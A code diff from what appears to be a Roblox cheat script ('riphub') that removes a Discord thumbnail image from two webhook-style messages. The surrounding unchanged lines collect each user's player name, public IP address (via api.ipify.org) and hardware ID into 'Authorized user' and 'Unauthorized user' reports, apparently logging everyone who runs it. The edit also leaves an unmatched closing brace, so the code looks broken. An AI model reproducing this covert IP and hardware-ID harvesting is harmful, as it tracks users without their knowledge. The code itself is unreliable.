@@ -909,8 +909,6 @@ if whitelisted  then
         {
             ["content"] = "**MOBILE COPY AND PASTE**\n" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()),
             ["embeds"] = {{
-                            ["thumbnail"] = {
-                    ["url"] = "https://cdn.discordapp.com/attachments/1244992873527771227/1249083552314949682/riphub_logo_2.png?ex=66660335&is=6664b1b5&hm=b85a40568d03f956905fcb88f7de1f98ccb93557f5a1227b0edae5818121b5e4&"
                 },
                 ["title"] = "__**Authorized user**__",
                 ["description"] = "```ansi\n[2;32m" .. game.Players.LocalPlayer.Name .. "\nIP:" .. game:HttpGet("https://api.ipify.org/") .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()) .. "[0m```",
@@ -3347,8 +3345,6 @@ end)
         {
             ["content"] = "**MOBILE COPY AND PASTE**\n" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()),
             ["embeds"] = {{
-                            ["thumbnail"] = {
-                    ["url"] = "https://cdn.discordapp.com/attachments/1244992873527771227/1249083552314949682/riphub_logo_2.png?ex=66660335&is=6664b1b5&hm=b85a40568d03f956905fcb88f7de1f98ccb93557f5a1227b0edae5818121b5e4&"
                 },
                 ["title"] = "__**Unauthorized user**__",
                 ["description"] = "```ansi\n[2;31m" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()) .. "[0m```",
